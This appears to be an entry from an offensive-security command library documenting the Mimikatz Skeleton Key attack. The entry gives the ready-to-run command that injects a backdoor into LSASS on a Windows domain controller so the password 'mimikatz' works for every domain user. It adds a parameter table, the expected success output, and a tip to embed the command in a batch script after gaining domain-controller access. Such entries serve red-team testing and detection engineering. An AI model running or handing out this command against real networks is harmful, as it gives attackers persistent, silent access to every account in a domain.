---
id: 07faf18a-1428-4c06-bace-8183bbd4997b
name: mimikatz-execute-skeleton-key
type: command
executor: cmd
data: 'mimikatz "privilege::debug" "misc::skeleton"'
output: null
created_at: '2023-04-06T03:56:28.268830+00:00'
updated_at: '2023-10-10T20:37:25.397457+00:00'
platforms:
  - Windows
tags:
  - persistence
  - credential-access
verified: true
validated: true
---

# mimikatz-execute-skeleton-key

## Command

```cmd
mimikatz "privilege::debug" "misc::skeleton"
```

## Description

This command uses Mimikatz to enable debug privileges in the current process and inject the Skeleton Key backdoor into the LSASS authentication process on a Windows domain controller. It allows subsequent logins with the password "mimikatz" for any domain user.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `privilege::debug` | Enables SeDebugPrivilege for LSASS access | Yes |
| `misc::skeleton` | Applies the Skeleton Key modification to authentication | Yes |

## Examples

### Basic Usage

```cmd
mimikatz "privilege::debug" "misc::skeleton"
```

### Usage in Script

Embed in a batch file for automated execution after gaining DC access.

## Expected Output

```
Privilege '20' OK
misc::skeleton :
 * Skeleton Key (mimikatz) implemented
```

Success is confirmed by the "Skeleton Key implemented" message. Errors may indicate lack of admin privileges or LSASS protection.

## Related

- [[procedures/Skeleton-Key-Persistence]]
- [[tools/Mimikatz]]
